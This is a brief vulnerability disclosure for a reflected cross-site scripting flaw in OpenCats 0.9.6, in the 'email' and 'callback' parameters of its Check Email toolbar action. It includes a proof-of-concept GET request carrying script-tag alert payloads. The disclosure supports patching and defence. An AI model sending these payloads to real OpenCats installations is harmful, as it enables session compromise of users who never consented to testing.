# Cross Site Scripting vulnerability in the OpenCats 'email' parameter of Check Email functionality

OpenCats version 0.9.6 PHP7.2 suffers from reflected XSS vulnerability. 
This allows attackers arbitrary JavaScript injection, which compromises secure session between client and server.

### PoC
```
GET /index.php?m=toolbar&callback=<script>alert`xss`</script>&a=checkEmailIsInSystem&email=<script>alert(document.domain)</script>
```

![XSS](https://user-images.githubusercontent.com/57464251/193469122-7bfe081e-9228-4e6d-94f6-325557964344.png)
